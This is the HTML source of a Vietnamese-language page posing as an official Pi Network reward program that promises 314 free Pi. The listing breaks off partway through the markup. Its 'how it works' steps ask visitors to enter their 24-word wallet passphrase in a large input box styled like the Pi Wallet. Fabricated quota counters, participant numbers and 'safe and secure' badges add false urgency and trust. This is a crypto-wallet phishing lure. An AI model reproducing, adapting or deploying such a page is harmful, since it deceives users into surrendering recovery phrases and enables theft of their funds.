<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chương Trình Thưởng Pi Network</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pi-purple: #693988;
            --pi-purple-light: #693988;
            --pi-purple-dark: #693988;
            --pi-gold: #f8c056;
            --pi-gold-light: #ffd78c;
            --pi-gold-dark: #e6a938;
        }
        
        /* Dark mode styles */
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-primary: #1a0e24;
                --bg-secondary: #2a1052;
                --text-primary: #ffffff;
                --text-secondary: #e0d0ff;
                --card-bg: rgba(30, 12, 48, 0.85);
                --input-bg: rgba(30, 12, 48, 0.5);
            }
        }
        
        /* Light mode styles */
        @media (prefers-color-scheme: light) {
            :root {
                --bg-primary: #f5efff;
                --bg-secondary: #eee6ff;
                --text-primary: #333333;
                --text-secondary: #666666;
                --card-bg: rgba(255, 255, 255, 0.85);
                --input-bg: rgba(255, 255, 255, 0.8);
            }
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            will-change: transform; /* Optimize for animations */
        }
        
        .pi-header {
            background-color: var(--pi-purple);
            padding: 14px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
            height: 64px;
            z-index: 50;
            box-shadow: 0 4px 20px rgba(122, 53, 164, 0.3);
        }
        
        .pi-header-content {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            position: relative;
        }
        
        .header-back-btn {
            position: absolute;
            left: 0;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            transition: transform 0.2s;
        }
        
        .header-back-btn:hover {
            transform: translateX(-2px);
        }
        
        .header-dropdown-btn {
            position: absolute;
            right: 0;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            transition: transform 0.2s;
        }
        
        .header-dropdown-btn:hover {
            transform: translateY(2px);
        }
        
        .wallet-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: var(--pi-purple);
            margin-right: 10px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
            position: relative;
            overflow: hidden;
        }
        
        .wallet-icon::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                rgba(255, 255, 255, 0) 0%,
                rgba(255, 255, 255, 0) 40%,
                rgba(255, 255, 255, 0.4) 50%,
                rgba(255, 255, 255, 0) 60%,
                rgba(255, 255, 255, 0) 100%
            );
            transform: rotate(30deg);
            animation: shineIcon 3s infinite;
        }
        
        .wallet-text {
            color: white;
            font-size: 18px;
            font-weight: 500;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }
        
        .pi-coin-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: var(--pi-purple);
            margin-left: 10px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
            position: relative;
            overflow: hidden;
        }
        
        .pi-coin-icon::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                to bottom right,
                rgba(255, 255, 255, 0) 0%,
                rgba(255, 255, 255, 0) 40%,
                rgba(255, 255, 255, 0.4) 50%,
                rgba(255, 255, 255, 0) 60%,
                rgba(255, 255, 255, 0) 100%
            );
            transform: rotate(30deg);
            animation: shineIcon 3s infinite;
            animation-delay: 1s;
        }
        
        /* Premium background elements - simplified */
        .premium-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -10;
            overflow: hidden;
            pointer-events: none; /* prevent interaction with background */
        }
        
        /* Animated gradient - simplified */
        .animated-gradient {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(154, 83, 198, 0.08) 0%, transparent 60%),
                radial-gradient(circle at 80% 20%, rgba(154, 83, 198, 0.08) 0%, transparent 50%);
            opacity: 0.7; /* Reduced opacity */
        }
        
        /* Light streaks - simplified and reduced */
        .light-streak {
            position: absolute;
            height: 1px;
            width: 200px;
            background: linear-gradient(90deg, transparent, rgba(154, 83, 198, 0.5), transparent);
            border-radius: 100%;
            opacity: 0;
            animation: lightStreak 12s linear infinite; /* Slower animation */
            will-change: transform, opacity; /* Optimize animation */
        }
        
        /* Moving waves - retained but simplified */
        .wave-container {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            opacity: 0.2; /* Reduced opacity */
        }
        
        .wave {
            position: absolute;
            width: 200%;
            height: 200%;
            border-radius: 40%;
            opacity: 0.2;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: waveRotate 60s linear infinite; /* Slowed down */
            will-change: transform; /* Optimize animation */
        }
        
        .wave1 {
            border: 1px solid rgba(154, 83, 198, 0.3);
            animation-duration: 60s; /* Slowed down */
        }
        
        .wave2 {
            border: 1px solid rgba(248, 192, 86, 0.3);
            animation-duration: 50s; /* Slowed down */
            animation-direction: reverse;
        }
        
        .wave3 {
            border: 1px solid rgba(154, 83, 198, 0.2);
            animation-duration: 70s; /* Slowed down */
        }
        
        /* Stars - reduced */
        .star {
            position: absolute;
            background-color: white;
            border-radius: 50%;
            filter: blur(1px);
            opacity: 0.4;
            animation: twinkle 4s infinite ease-in-out;
        }
        
        /* Star with single point */
        .star-single {
            position: absolute;
            width: 2px;
            height: 2px;
            background-color: white;
            border-radius: 50%;
            filter: blur(0.5px);
            opacity: 0.8;
            box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
            animation: twinkleStar 3s infinite ease-in-out;
        }

        

        /* Pi coins - reduced, simplified */
        .premium-coin {
            position: absolute;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: var(--pi-purple);
            z-index: -1;
            transform-style: preserve-3d;
            will-change: transform; /* Optimize animation */
        }
        
        .coin-inner {
            position: relative;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            text-align: center;
            transition: transform 0.6s;
            transform-style: preserve-3d;
            animation: coinRotate 20s infinite linear; /* Slowed down */
        }
        
        .coin-front, .coin-back {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            backface-visibility: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            font-weight: bold;
        }
        
        .coin-front {
            background: radial-gradient(circle at 30% 30%, var(--pi-gold), var(--pi-gold-dark));
            box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
        }
        
        .coin-back {
            background: radial-gradient(circle at 30% 30%, var(--pi-gold-dark), var(--pi-gold));
            transform: rotateY(180deg);
            box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
        }
        
        /* Floating particles - reduced */
        .particle {
            position: absolute;
            width: 6px;
            height: 6px;
            background-color: rgba(154, 83, 198, 0.2);
            border-radius: 50%;
            filter: blur(1px);
            animation: floatParticle 15s infinite linear;
            will-change: transform; /* Optimize animation */
        }
        
        /* Feature card with enhanced wave effect */
        .feature-card {
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .feature-card-wave {
            position: absolute;
            top: 0;
            left: 0;
            width: 200%;
            height: 200%;
            background: radial-gradient(
                ellipse at center,
                rgba(105, 57, 136, 0.2) 0%,
                rgba(105, 57, 136, 0.1) 25%,
                rgba(105, 57, 136, 0) 70%
            );
            opacity: 0;
            border-radius: 50%;
            transform: translate(-25%, -25%) scale(0.1);
            animation: cardWave 4s infinite ease-out;
            pointer-events: none;
        }
        
        /* Shiny wave effect for feature icons */
        .feature-icon {
            position: relative;
            overflow: hidden;
        }
        
        .feature-icon::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -100%;
            width: 70%;
            height: 200%;
            background: linear-gradient(
                to right,
                rgba(255, 255, 255, 0) 0%,
                rgba(255, 255, 255, 0.3) 50%,
                rgba(255, 255, 255, 0) 100%
            );
            transform: rotate(30deg);
            animation: shinyWave 3s infinite ease-in-out;
            pointer-events: none;
        }

        /* Confetti elements for success animation */
        .confetti-container {
            position: fixed;
            width: 100vw;
            height: 100vh;
            top: 0;
            left: 0;
            z-index: 1000;
            pointer-events: none;
            overflow: hidden;
            display: none;
        }

        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: var(--pi-gold);
            opacity: 0;
        }

        /* Square confetti */
        .confetti-square {
            background-color: var(--pi-purple);
        }

        /* Circle confetti */
        .confetti-circle {
            border-radius: 50%;
            background-color: var(--pi-gold);
        }

        /* Triangle confetti */
        .confetti-triangle {
            width: 0;
            height: 0;
            background-color: transparent;
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-bottom: 10px solid var(--pi-purple-light);
        }
        
        /* Page container and transitions */
        .page-container {
            width: 100%;
            max-width: 100vw;
            overflow-x: hidden;
            min-height: calc(100vh - 64px);
            position: relative;
        }
        
        .page {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            min-height: calc(100vh - 64px);
            transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            background-color: transparent;
            z-index: 10;
            will-change: transform, opacity; /* Optimize animation */
        }
        
        .page-active {
            transform: translateX(0);
            opacity: 1;
            z-index: 11;
        }
        
        .page-inactive-right {
            transform: translateX(100%);
            opacity: 0;
            z-index: 9;
            pointer-events: none;
        }
        
        .page-inactive-left {
            transform: translateX(-100%);
            opacity: 0;
            z-index: 9;
            pointer-events: none;
        }
        
        /* Premium cards */
        .card {
            background-color: var(--card-bg);
            backdrop-filter: blur(15px);
            border-radius: 1.2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
            pointer-events: none;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
        }
        
        /* Premium buttons */
        .btn-primary {
            background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
            color: white;
            font-weight: 600;
            border-radius: 1rem;
            padding: 0.9rem 2rem;
            transition: all 0.3s ease;
            box-shadow: 0 6px 15px rgba(122, 53, 164, 0.25);
            position: relative;
            overflow: hidden;
            z-index: 1;
            border: none;
            outline: none;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(122, 53, 164, 0.4);
        }
        
        .btn-primary:active {
            transform: translateY(1px);
        }
        
        .btn-secondary {
            background: rgba(122, 53, 164, 0.1);
            color: var(--pi-purple);
            font-weight: 600;
            border-radius: 1rem;
            padding: 0.75rem 1.5rem;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            border: 1px solid rgba(122, 53, 164, 0.2);
        }
        
        .btn-secondary:hover {
            background: rgba(122, 53, 164, 0.15);
            transform: translateY(-2px);
        }
        
        /* Premium reward cards - optimized */
        .reward-card {
            position: relative;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            overflow: hidden;
            border-top: 3px solid transparent;
            background: linear-gradient(var(--card-bg), var(--card-bg)) padding-box,
                       linear-gradient(90deg, var(--pi-purple), var(--pi-gold)) border-box;
        }
        
        .reward-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
        }
        
        .reward-amount {
            color: var(--pi-purple);
            font-weight: bold;
            font-size: 2rem;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            z-index: 1;
        }
        
        .reward-amount::before {
            content: "π";
            font-size: 2.2rem;
            margin-right: 0.2rem;
        }
        
        .reward-amount::after {
            content: '';
            position: absolute;
            width: 70px;
            height: 70px;
            background: radial-gradient(circle, rgba(248, 192, 86, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            z-index: -1;
        }
        
        /* Premium progress bar - optimized */
        .progress-bar {
            height: 8px;
            border-radius: 10px;
            background: rgba(122, 53, 164, 0.1);
            overflow: hidden;
            position: relative;
        }
        
        .progress-fill {
            height: 100%;
            border-radius: 10px;
            background: linear-gradient(90deg, var(--pi-purple), var(--pi-purple-light));
            position: relative;
            overflow: hidden;
        }
        
        /* Premium feature icons - optimized */
        .feature-icon {
            width: 70px;
            height: 70px;
            border-radius: 18px;
            background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
            box-shadow: 0 8px 20px rgba(122, 53, 164, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            position: relative;
            overflow: hidden;
        }
        
        .feature-icon i {
            font-size: 2rem;
            color: white;
            position: relative;
            z-index: 2;
        }

        /* Pi Wallet style form */
        .pi-wallet-style {
            margin: 0 auto;
            max-width: 500px;
            padding: 0 20px;
        }

        .pi-title {
            font-size: 1.5rem;
            font-weight: bold;
            text-align: center;
            margin-bottom: 1.7rem;
        }

        .pi-input-container {
            margin-bottom: 1.3rem;
            border-radius: 16px;
            height: 250px; /* Tăng chiều cao */
            overflow: hidden;
            background: var(--input-bg);
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            max-width: 1000px; /* Điều chỉnh độ rộng tại đây */
            margin-left: auto;
            margin-right: auto;
            display: flex;
            flex-direction: column;
        }

        .pi-input {
            width: 100%;
            padding: 24px;
            height: 250px; /* Tăng chiều cao */
            resize: none; 
            background: transparent;
            border: none;
            font-size: 1.1rem;
            color: var(--text-secondary);
            outline: none;
            vertical-align: top;
            text-align: left;
            word-break: break-word;
            overflow-wrap: break-word;
            white-space: pre-wrap;
            display: block;
            align-self: flex-start;
        }

        .pi-button {
            width: 100%;
            padding: 16px;
            font-size: 1rem;
            font-weight: 600;
            text-transform: uppercase;
            text-align: center;
            border-radius: 16px;
            margin-bottom: 1rem;
            transition: all 0.3s ease;
        }

        .pi-button-primary {
            background-color: var(--pi-purple);
            color: white;
            border: none;
            box-shadow: 0 6px 12px rgba(122, 53, 164, 0.25);
        }

        .pi-button-primary:hover {
            background-color: var(--pi-purple-light);
            transform: translateY(-2px);
            box-shadow: 0 8px 16px rgba(122, 53, 164, 0.35);
        }

        .pi-button-secondary {
            background-color: transparent;
            color: var(--pi-purple);
            border: 1px solid var(--pi-purple);
        }

        .pi-button-secondary:hover {
            background-color: rgba(122, 53, 164, 0.05);
            transform: translateY(-2px);
        }

        .pi-info-text {
            font-size: 1.1rem;
            line-height: 1.6;
            color: var(--text-secondary);
            margin-top: 2rem;
            text-align: left; /* Căn lề trái */
            word-wrap: break-word; /* Cho phép xuống dòng khi cần */
            white-space: normal; /* Hiển thị toàn bộ nội dung */
            width: 100%; /* Đảm bảo hiển thị hết chiều ngang */
        }

        .pi-link {
            color: #3d9dff;
            text-decoration: none;
        }

        /* Scroll animations - optimized */
        .animate-on-scroll {
            opacity: 0;
            transform: translateY(30px);
            transition: opacity 0.8s ease, transform 0.8s ease;
            will-change: opacity, transform; /* Optimize animation */
        }

        .animate-on-scroll.animated {
            opacity: 1;
            transform: translateY(0);
        }

        .animate-fade-in {
            opacity: 0;
            transition: opacity 1s ease;
            will-change: opacity; /* Optimize animation */
        }

        .animate-fade-in.animated {
            opacity: 1;
        }

        /* Simplified about section illustration */
        .about-illustration {
            width: 180px;
            height: 180px;
            margin: 0 auto 2rem;
            position: relative;
        }

        .about-circle {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(154, 83, 198, 0.1), rgba(154, 83, 198, 0.2));
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        .about-circle::before {
            content: '';
            position: absolute;
            width: 90%;
            height: 90%;
            border-radius: 50%;
            border: 2px dashed rgba(154, 83, 198, 0.3);
        }

        .about-icon {
            font-size: 4rem;
            color: var(--pi-purple);
            position: relative;
            z-index: 1;
        }

        /* Loading overlay */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(5px);
        }
        
        .loading-spinner {
            position: relative;
            width: 80px;
            height: 80px;
        }
        
        .loading-spinner::before, 
        .loading-spinner::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 4px solid transparent;
            border-top-color: var(--pi-purple);
            animation: spin 1.5s linear infinite;
            box-shadow: 0 0 10px rgba(122, 53, 164, 0.3);
        }
        
        .loading-spinner::after {
            border-top-color: transparent;
            border-bottom-color: var(--pi-gold);
            animation-duration: 1s;
        }
        
        .loading-spinner-label {
            position: absolute;
            top: 120%;
            left: 50%;
            transform: translateX(-50%);
            color: white;
            font-weight: 500;
            white-space: nowrap;
        }

        /* Simplified explosion particles */
        .surprise-container {
            position: relative;
            overflow: hidden;
        }

        .surprise-trigger.active .explosion-particle {
            animation: explode 1s forwards;
        }

        .explosion-particle {
            position: absolute;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background-color: var(--pi-gold);
            opacity: 0;
            pointer-events: none;
        }

        /* Simplified 3D effect for better performance */
        .tilt-card {
            transform-style: preserve-3d;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .tilt-card:hover {
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }

        /* Certificate badge */
        .certificate {
            position: relative;
            padding: 1.5rem;
            border-radius: 1rem;
            background: linear-gradient(135deg, rgba(248, 192, 86, 0.1), rgba(154, 83, 198, 0.1));
            border: 1px dashed rgba(248, 192, 86, 0.3);
            margin-top: 2rem;
        }

        .certificate-icon {
            position: absolute;
            top: -20px;
            left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }

        .certificate-icon i {
            color: white;
            font-size: 1.2rem;
        }

        .certificate-title {
            font-weight: bold;
            text-align: center;
            margin-bottom: 0.5rem;
            margin-top: 0.5rem;
        }

        .certificate-text {
            text-align: center;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        /* Floating icons - reduced */
        .floating-icon {
            position: absolute;
            z-index: -1;
            opacity: 0.5;
        }

        /* Word counter styles */
        .word-counter {
            text-align: right;
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-top: 0.5rem;
            margin-bottom: 0.5rem;
            padding-right: 0.5rem;
            display: none; /* Hidden by default, only shown for invalid count */
        }

        .word-counter.invalid {
            color: #F44336;
            font-weight: 600;
            display: block; /* Show only when invalid */
        }

        /* Validation message */
        .validation-message {
            color: #F44336;
            font-size: 0.9rem;
            margin-top: 0.5rem;
            margin-bottom: 1rem;
            text-align: center;
        }

        .hidden {
            display: none;
        }

        /* Visual indicator for input container */
        .pi-input-container.valid-input {
            border: 2px solid #4CAF50;
        }

        .pi-input-container.invalid-input {
            border: 2px solid #F44336;
        }

        #formPage {
            background-color: white !important;
        }

        #formPage .pi-wallet-style {
            background-color: white;
        }

        #formPage .pi-title {
            color: #333;
        }

        #formPage .pi-info-text {
            color: #555;
        }

        /* Đảm bảo input vẫn hiển thị tốt trên nền trắng */
        #formPage .pi-input-container {
            background: #f8f8f8;
            border: 1px solid #ddd;
        }

        #formPage .pi-input {
            color: #333;
        }

        /* Optimized Animations */
        @keyframes shineIcon {
            0% { transform: rotate(30deg) translateX(-100%); }
            100% { transform: rotate(30deg) translateX(100%); }
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 0.5; }
        }

        @keyframes twinkleStar {
            0%, 100% { 
                opacity: 0.4;
                transform: scale(1);
            }
            50% { 
                opacity: 0.8;
                transform: scale(1.2);
            }
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        @keyframes floatParticle {
            0% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
            100% { transform: translateY(0); }
        }
        
        @keyframes waveRotate {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
        
        @keyframes coinRotate {
            0% { transform: rotateY(0deg); }
            100% { transform: rotateY(360deg); }
        }

        @keyframes explode {
            0% {
                opacity: 1;
                transform: translate(0, 0) scale(1);
            }
            100% {
                opacity: 0;
                transform: translate(var(--tx), var(--ty)) scale(0);
            }
        }

        @keyframes lightStreak {
            0%, 100% {
                opacity: 0;
                transform: rotate(45deg) translateX(-100px);
            }
            10%, 90% {
                opacity: 0.2;
            }
            50% {
                transform: rotate(45deg) translateX(calc(100vw + 100px));
            }
        }

        /* Fixed shooting star animation with proper direction and fading */
        @keyframes shootingStar {
            0% {
                opacity: 0;
                transform: translateX(0) translateY(0);
            }
            10%, 15% {
                opacity: 0.3;
            }
            45% {
                opacity: 1;
            }
            70% {
                opacity: 0.3;
            }
            100% {
                opacity: 0;
                transform: translateX(300px) translateY(300px);
            }
        }

        /* Card wave animation */
        @keyframes cardWave {
            0%, 100% {
                opacity: 0;
                transform: translate(-25%, -25%) scale(0.1);
            }
            50% {
                opacity: 0.4;
                transform: translate(-25%, -25%) scale(1.8);
            }
        }

        /* Confetti animation */
        @keyframes confettiFall {
            0% {
                opacity: 1;
                transform: translateY(-10vh) rotate(0deg);
            }
            100% {
                opacity: 0.2;
                transform: translateY(100vh) rotate(720deg);
            }
        }
        
        /* Shiny wave animation for feature icons */
        @keyframes shinyWave {
            0% {
                left: -100%;
            }
            100% {
                left: 150%;
            }
        }
    </style>
</head>
<body>
    <!-- Premium Background Elements - With optimized shooting stars -->
    <div class="premium-bg">
        <div class="animated-gradient"></div>
        <div class="wave-container">
            <div class="wave wave1"></div>
            <div class="wave wave2"></div>
            <div class="wave wave3"></div>
        </div>
        <div id="starsContainer"></div>
        <div id="singleStarsContainer"></div>
        <div id="shootingStarsContainer"></div>
        <div id="particlesContainer"></div>
        <div id="coinsContainer"></div>
        <div id="lightStreaksContainer"></div>
    </div>
    
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-spinner">
            <div class="loading-spinner-label">Đang xử lý...</div>
        </div>
    </div>

    <!-- Confetti container for success celebration -->
    <div id="confettiContainer" class="confetti-container"></div>

    <!-- Pi Wallet Header -->
    <header class="pi-header">
        <div class="pi-header-content">
            <button class="header-back-btn" id="headerBackBtn">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M15 18l-6-6 6-6"></path>
                </svg>
            </button>
            
            <div class="flex items-center">
                <div class="wallet-icon">π</div>
                <span class="wallet-text">Wallet</span>
                <div class="pi-coin-icon">π</div>
            </div>
            
            <button class="header-dropdown-btn" id="headerDropdownBtn">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M6 9l6 6 6-6"></path>
                </svg>
            </button>
        </div>
    </header>
    
    <!-- Main Content -->
    <div class="page-container">
        <!-- Home Page -->
        <div id="homePage" class="page page-active">
            <div class="container mx-auto px-4 py-8">
                <!-- Hero Section -->
                <section class="text-center mb-16 relative">
                    <i class="fas fa-star floating-icon" style="top: 10%; right: 10%; opacity: 0.3;"></i>
                    <i class="fas fa-coins floating-icon" style="bottom: 20%; left: 5%; opacity: 0.3;"></i>
                    
                    <h2 class="text-4xl font-bold mb-6 inline-block relative animate-on-scroll">
                        Nhận Thưởng Pi Network
                        <span class="absolute -top-3 -right-6 text-xs font-bold bg-gradient-to-r from-yellow-400 to-yellow-600 text-white px-2 py-1 rounded-full transform rotate-12">Mới</span>
                    </h2>
                    <p class="text-lg mb-8 max-w-2xl mx-auto animate-on-scroll" data-delay="200">Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi Network.</p>
                    <button id="openFormBtn" class="btn-primary text-lg animate-on-scroll" data-delay="400">Nhận Thưởng 314 Pi Ngay</button>
                    
                    <!-- Features with enhanced wave effect -->
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12">
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-check-circle"></i>
                            </div>
                            <p class="font-medium mt-4">Chương Trình Xác Thực</p>
                        </div>
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-clock"></i>
                            </div>
                            <p class="font-medium mt-4">Nhận Trong 24h</p>
                        </div>
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <p class="font-medium mt-4">An Toàn & Bảo Mật</p>
                        </div>
                        <div class="card p-5 feature-card">
                            <div class="feature-card-wave"></div>
                            <div class="feature-icon">
                                <i class="fas fa-users"></i>
                            </div>
                            <p class="font-medium mt-4">500000+ Người Tham Gia</p>
                        </div>
                    </div>
                </section>
                
                <!-- Rewards Section - Simplified -->
                <section class="mb-16">
                    <h3 class="text-3xl font-bold mb-8 text-center relative inline-block animate-on-scroll">
                        Phần Thưởng Khả Dụng
                        <div class="absolute bottom-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 to-purple-800"></div>
                    </h3>
                    <div class="grid md:grid-cols-3 gap-8">
                        <div class="card reward-card p-8 animate-on-scroll" data-delay="200">
                            <div class="absolute top-3 right-3 text-xs font-bold bg-gradient-to-r from-purple-500 to-purple-800 text-white px-2 py-1 rounded-full">Hot</div>
                            <h4 class="text-xl font-bold mb-2">Thưởng Người Dùng Mới</h4>
                            <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Người dùng mới</p>
                            <p class="reward-amount mb-4">50</p>
                            <div class="progress-bar mb-2">
                                <div class="progress-fill" style="width: 1.9%"></div>
                            </div>
                            <p class="text-sm text-right">Còn lại: 1842/100000</p>
                        </div>
                        
                        <div class="card reward-card p-8 animate-on-scroll" data-delay="400">
                            <h4 class="text-xl font-bold mb-2">Phần Thưởng Tiên Phong</h4>
                            <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Có thời hạn</p>
                            <p class="reward-amount mb-4">314</p>
                            <div class="progress-bar mb-2">
                                <div class="progress-fill" style="width: 68.6%"></div>
                            </div>
                            <p class="text-sm text-right">Còn lại: 34013/50000</p>
                        </div>
                        
                        <div class="card reward-card p-8 animate-on-scroll" data-delay="600">
                            <h4 class="text-xl font-bold mb-2">Thưởng Cộng Đồng</h4>
                            <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Thưởng giới thiệu trên 100+</p>
                            <p class="reward-amount mb-4">100</p>
                            <div class="progress-bar mb-2">
                                <div class="progress-fill" style="width: 22.75%"></div>
                            </div>
                            <p class="text-sm text-right">Còn lại: 2295/20000</p>
                        </div>
                    </div>
                </section>
                
                <!-- About Section with Simplified Illustration -->
                <section class="mb-16 animate-on-scroll">
                    <div class="card p-8 max-w-4xl mx-auto">
                        <h3 class="text-3xl font-bold mb-8 text-center">Về Chương Trình Này</h3>
                        
                        <!-- Simplified About Illustration -->
                        <div class="about-illustration">
                            <div class="about-circle">
                                <i class="fas fa-coins about-icon"></i>
                            </div>
                        </div>
                        
                        <p class="mb-8 text-lg text-center">Chương trình thưởng này là sáng kiến do Picoreteam và nhà tài trợ thực hiện để hỗ trợ những người tiên phong Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi chỉ phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.</p>
                        
                        <h4 class="text-2xl font-bold mb-6 text-center">Cách Thức Hoạt Động</h4>
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-8">
                            <div class="text-center">
                                <div class="text-2xl font-bold text-purple-600 mb-2">1</div>
                                <p>Nhấn vào nút "Nhận Pi 314 Pi Miễn Phí Ngay" phía trên</p>
                            </div>
                            <div class="text-center">
                                <div class="text-2xl font-bold text-purple-600 mb-2">2</div>
                                <p>Nhập cụm 24 từ để đăng nhập và claim Pi thưởng</p>
                            </div>
                            <div class="text-center">
                                <div class="text-2xl font-bold text-purple-600 mb-2">3</div>
                                <p>Gửi yêu cầu của bạn để xác minh</p>
                            </div>
                            <div class="text-center">
                                <div class="text-2xl font-bold text-purple-600 mb-2">4</div>
                                <p>Nhận phần thưởng Pi trong vòng 24 giờ</p>
                            </div>
                        </div>
                        
                        <div class="certificate">
                            <div class="certificate-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
